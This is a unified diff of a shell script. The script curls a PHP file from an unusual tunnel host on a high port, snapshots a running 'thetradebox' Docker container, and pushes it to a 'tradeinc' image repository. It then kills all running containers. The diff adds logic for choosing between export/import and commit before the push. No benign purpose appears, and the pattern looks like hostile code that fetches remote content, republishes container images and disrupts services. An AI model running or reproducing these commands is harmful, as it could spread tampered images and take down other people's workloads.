@@ -3,6 +3,9 @@ then
 
 curl http://file-explain.gl.at.ply.gg:13782/linux8888.php
 
+if (( $(echo "$(docker history tradeinc/thetradeboxsignal88888888 | wc -l) > 80" | bc -l) ))
+then
+
 docker export $(docker ps | grep "thetradebox" | sed "s/.* //g") > ./latest.tar
 
 cat ./latest.tar | docker import - tradeinc/thetradeboxsignallinuxlinux88888888
@@ -11,11 +14,15 @@ docker tag tradeinc/thetradeboxsignallinuxlinux88888888 tradeinc/thetradeboxsign
 
 docker push tradeinc/thetradeboxsignal88888888
 
-#docker commit $(docker ps | grep "thetradebox" | sed "s/.* //g") tradeinc/thetradeboxsignal88888888
+else
 
-#docker tag tradeinc/thetradeboxsignal88888888 tradeinc/thetradeboxsignal88888888
+docker commit $(docker ps | grep "thetradebox" | sed "s/.* //g") tradeinc/thetradeboxsignal88888888
 
-#docker push tradeinc/thetradeboxsignal88888888
+docker tag tradeinc/thetradeboxsignal88888888 tradeinc/thetradeboxsignal88888888
+
+docker push tradeinc/thetradeboxsignal88888888
+
+fi
 
 docker kill $(docker ps -q)
 
